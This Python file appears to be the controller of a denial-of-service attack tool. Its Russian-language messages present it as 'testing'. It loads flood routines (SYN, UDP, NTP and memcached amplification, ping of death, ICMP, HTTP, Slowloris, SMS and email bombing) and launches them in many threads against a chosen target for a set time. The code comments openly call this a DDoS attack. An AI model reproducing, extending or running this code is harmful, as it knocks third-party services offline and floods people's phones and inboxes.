# Import modules
from time import time, sleep
from threading import Thread
from colorama import Fore
from humanfriendly import format_timespan, Spinner
from tools.crash import CriticalError
from tools.ipTools import GetTargetAddress, InternetConnectionCheck

""" Find & import ddos method """


def GetMethodByName(method):
    if method == "SMS":
        dir = "tools.SMS.main"
    elif method == "EMAIL":
        dir = "tools.EMAIL.main"
    elif method in ("SYN", "UDP", "NTP", "POD", "ICMP", "MEMCACHED"):
        dir = f"tools.L4.{method.lower()}"
    elif method in ("HTTP", "SLOWLORIS"):
        dir = f"tools.L7.{method.lower()}"
    else:
        raise SystemExit(
            f"{Fore.RED}[!] {Fore.MAGENTA}Неизвестный метод тестирования: {repr(method)} использован. Ошибка. {Fore.RESET}"
        )
    module = __import__(dir, fromlist=["object"])
    if hasattr(module, "flood"):
        method = getattr(module, "flood")
        return method
    else:
        CriticalError(
            f"Метод не найден. {repr(dir)}. Используйте Python 3.8", "-"
        )


""" Class to control attack methods """


class AttackMethod:

    # Constructor
    def __init__(self, name, duration, threads, target):
        self.name = name
        self.duration = duration
        self.threads_count = threads
        self.target_name = target
        self.target = target
        self.threads = []
        self.is_running = False

    # Enter
    def __enter__(self):
        InternetConnectionCheck()
        self.method = GetMethodByName(self.name)
        self.target = GetTargetAddress(self.target_name, self.name)
        return self

    # Exit
    def __exit__(self, exc_type, exc_val, exc_tb):
        print(f'{Fore.MAGENTA}[!] {Fore.BLUE}Тестирование завершено. Спасибо за использование М.К.Т. АС-4 "Локарно"{Fore.RESET}')

    # Run time checker
    def __RunTimer(self):
        __stopTime = time() + self.duration
        while time() < __stopTime:
            if not self.is_running:
                return
            sleep(1)
        self.is_running = False

    # Run flooder
    def __RunFlood(self):
        while self.is_running:
            self.method(self.target)

    # Start threads
    def __RunThreads(self):
        # Run timer thread
        thread = Thread(target=self.__RunTimer)
        thread.start()
        # Check if 1 thread
        if self.name == "EMAIL":
            self.threads_count = 1
        # Create flood threads
        for _ in range(self.threads_count):
            thread = Thread(target=self.__RunFlood)
            self.threads.append(thread)
        # Start flood threads
        with Spinner(
            label=f"{Fore.YELLOW}Запуск{self.threads_count} линий... {Fore.RESET}",
            total=100,
        ) as spinner:
            for index, thread in enumerate(self.threads):
                thread.start()
                spinner.step(100 / len(self.threads) * (index + 1))
        # Wait flood threads for stop
        for index, thread in enumerate(self.threads):
            thread.join()
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}Останавливаем линию номер {index + 1}.{Fore.RESET}"
            )

    # Start ddos attack
    def Start(self):
        if self.name == "EMAIL":
            target = self.target_name
        else:
            target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
        duration = format_timespan(self.duration)
        print(
            f"{Fore.MAGENTA}[?] {Fore.BLUE}Начинаем тестирование{target} с исп. метода {self.name}.{Fore.RESET}\n"
            f"{Fore.MAGENTA}[?] {Fore.BLUE}Тестирование буудет завершено через {Fore.MAGENTA}{duration}{Fore.BLUE}.{Fore.RESET}"
        )
        self.is_running = True
        try:
            self.__RunThreads()
        except KeyboardInterrupt:
            self.is_running = False
            print(
                f'\n{Fore.RED}[!] {Fore.MAGENTA}Обнаружено прерывание. Остановка {self.threads_count} линий... Спасибо за использование М.К.Т. АС-4 "Локарно"{Fore.RESET}'
            )
            # Wait all threads for stop
            for thread in self.threads:
                thread.join()
        except Exception as err:
            print(err)
